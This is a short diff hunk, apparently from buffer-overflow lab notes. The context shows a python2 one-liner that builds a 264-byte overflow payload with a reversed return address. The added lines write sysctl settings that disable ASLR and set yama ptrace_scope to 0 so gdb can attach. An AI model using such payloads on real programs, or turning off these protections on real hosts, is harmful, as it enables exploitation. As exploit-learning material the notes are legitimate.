@@ -53,4 +53,6 @@ $ python2 -c  'print "A" * 264 + "\x7f\xff\xff\xdc\x90\x0d"[::-1] ' | hexdump -v
 0000100 4141 4141 4141 4141 900d ffdc 7fff 000a
 000010f
 
-
+To disable aslr and config yama to allow gdb to attach to process
+echo kernel.randomize_va_space=0 > /etc/sysctl.d/01_disable_aslr.conf
+echo kernel.yama.ptrace_scope=0 > /etc/sysctl.d/01_ptrace.conf
